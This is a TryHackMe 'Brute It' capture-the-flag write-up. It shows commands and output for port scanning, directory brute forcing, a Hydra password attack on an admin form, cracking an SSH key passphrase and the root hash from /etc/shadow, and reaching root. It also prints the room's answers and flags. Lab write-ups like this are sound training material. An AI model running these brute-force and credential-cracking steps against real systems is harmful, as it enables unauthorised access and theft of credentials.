# [Brute It CTF] - Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Date Completed:** [22.09.2025]  
**Skills Used:** [Password cracking, Privilege escalation]  
**Tools Used:** [John the ripper, Hydra, Gobuster]

## Executive Summary

This writeup demonstrates the complete compromise of the "Brute It" TryHackMe machine through password brute forcing and privilege escalation techniques. Initial reconnaissance revealed a hidden admin login panel that was compromised using Hydra, providing access to an encrypted SSH private key. After cracking the key's passphrase with John the Ripper, SSH access was gained as user "john". Final privilege escalation to root was achieved by exploiting misconfigured sudo permissions to read /etc/shadow and crack the root password hash.

## Initial Reconnaissance

### Port Scanning

We start by running nmap with TCP SYN (-sS) and with information about the services running on the ports (-sV).

```bash
sudo nmap -sS -sV 10.10.213.164
[sudo] Mot de passe de armould :
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-17 22:34 CEST
Nmap scan report for 10.10.213.164
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

This already gave us a lot of information :
How many ports are open ? 2

What version of SSH is running ? OpenSSH 7.6p1

What version of Apache is running ? 2.4.29

Which Linux distribution is running ? Ubuntu

The web server's main page is simply Apache's default page. We are going to try and find hidden directories using gobuster.

```bash
gobuster -w ~/directory-list-2.3-small.txt -u 10.10.213.164

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.213.164/
[+] Threads      : 10
[+] Wordlist     : /home/armould/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2025/09/17 22:50:48 Starting gobuster
=====================================================
/admin (Status: 301)
Progress: 2299 / 87666 (2.62%)
```

I did not run it until the end because the next question suggests that I should only be looking for one hidden directory.

What is the hidden directory ? /admin

## Vulnerability Analysis

So let's visit this directory ! It is a basic login page with only username and password text fields, as well as a submit button. By inspecting the page, we can easily notice a little comment saying that the username is "admin". I will now try to perform a dictionnary attack on the page using hydra. When entering wrong credentials, the page shows "Username or password invalid". We use this to determine whether the password is correct or not.

```bash
hydra -l admin -P ~/rockyou.txt 10.10.93.17 -V http-form-post '/admin/:user=^USER^&pass=^PASS^:F=invalid'

[80][http-post-form] host: 10.10.93.17   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-20 00:47:11
```

We have a result !

What is the user:password of the admin panel ? admin:xavier

If we use these credentials on the admin panel, we can find the web flag : THM{brut3_f0rce_is_e4sy}, and an RSA private key that belongs to John.
I think that the private key is an SSH private key (as we saw that ssh is enabled on the machine).

We are going to use John the ripper to crack it, but first we need to convert the key to a format that it understands. The conversion was a bit of a struggle because of John the ripper's many different versions but I found the right python script :

```bash
python3 ~/john/run/ssh2john.py rsa > rsa.hash
```

And now for the cracking :

```bash
~/john/run/john --wordlist=/home/armould/rockyou.txt rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
rockinroll       (rsa)
1g 0:00:00:00 DONE (2025-09-21 12:46) 6.250g/s 454000p/s 454000c/s 454000C/s soulkeeper..rashon
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

What is John's RSA Private Key passphrase ? rockinroll

Here, I first tried to log in directly to the ssh service with this passphrase, without success. Indeed, this is the passphrase to the key that John uses to login, not his direct password. Therefore we need to log in to ssh using this key and passphrase :

```bash
chmod 600 rsa

ssh -i rsa john@10.10.65.55
Enter passphrase for key 'rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 21 15:20:03 UTC 2025

  System load:  0.08               Processes:           104
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 40%                IP address for ens5: 10.10.65.55
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106

```

We are in ! And the user flag is : THM{a_password_is_not_a_barrier}

## Privilege Escalation

By using sudo -l, we can see that john is authorised to execute /sys/cat with admin privileges. This makes us able to read /etc/shadow (which should only be accessible to root) and get the hash of the root password :  
root:$6$zdk0.jUm$ Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.

Passwords in /etc/shadow have this structure :$hash_algo$salt$hash. In our case, $6$ means that our hash was made with SHA-512. I copied the hash in a text file named roothash.

```bash
~/john/run/john --wordlist=/home/armould/rockyou.txt roothash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 20 OpenMP threads
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
football         (root)
1g 0:00:00:00 DONE (2025-09-22 20:24) 3.571g/s 9142p/s 9142c/s 9142C/s 123456..hassan
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

What is the root's password? football

Now that we have the root password, we can simply change user :

```bash
su root
Password:
root@bruteit:/home/john# whoami
root
```

Root flag : THM{pr1v1l3g3_3sc4l4t10n}
